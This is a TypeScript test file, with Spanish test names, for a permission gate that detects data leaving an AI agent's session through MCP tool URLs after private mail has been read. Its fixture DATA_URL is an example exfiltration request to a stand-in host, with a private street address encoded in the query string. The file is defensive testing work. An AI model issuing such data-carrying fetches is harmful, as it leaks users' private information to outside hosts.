import { describe, expect, it } from 'vitest';
import { egressUrlOf } from '../src/egress-taint.js';
import { Gate } from '../src/permissions.js';

function gate() {
  const asked: string[] = [];
  const g = new Gate({
    protectedPaths: [],
    allow: ['mail', 'mcp_web_fetch'],
    egressTaint: true,
    approver: (_c, reason) => {
      asked.push(reason);
      return true;
    },
  });
  return { g, asked };
}

const MAIL = { tool: 'mail', args: { action: 'read', id: '1' }, actor: 'me' };
const BODY = 'Te espero en la Calle del Pez 14, portal 3B, a las 19:30.';
const DATA_URL = 'https://otro.example/x?d=Calle%20del%20Pez%2014%20portal%203B';

describe('puerta de exfiltración: herramientas MCP con url', () => {
  it('una herramienta MCP permitida que pide una URL con datos tras leer el correo pregunta', async () => {
    const { g, asked } = gate();
    await g.check('s', MAIL);
    g.settle('s', MAIL, false, BODY);
    await g.check('s', { tool: 'mcp_web_fetch', args: { url: DATA_URL }, actor: 'me' });
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatch(/contenido privado/);
  });

  it('sin nada privado leído, o con una URL sin datos, no pregunta', async () => {
    const { g, asked } = gate();
    await g.check('s', { tool: 'mcp_web_fetch', args: { url: DATA_URL }, actor: 'me' });
    expect(asked).toHaveLength(0);
    await g.check('s', MAIL);
    g.settle('s', MAIL, false, BODY);
    await g.check('s', {
      tool: 'mcp_web_fetch',
      args: { url: 'https://docs.example/' },
      actor: 'me',
    });
    expect(asked).toHaveLength(0);
  });

  it('solo URLs http(s) de herramientas MCP cuentan como salida', () => {
    expect(egressUrlOf('mcp_web_fetch', { url: DATA_URL })).toBe(DATA_URL);
    expect(egressUrlOf('mcp_notes_open', { url: 'notes://abc' })).toBeNull();
    expect(egressUrlOf('otra', { url: DATA_URL })).toBeNull();
  });
});
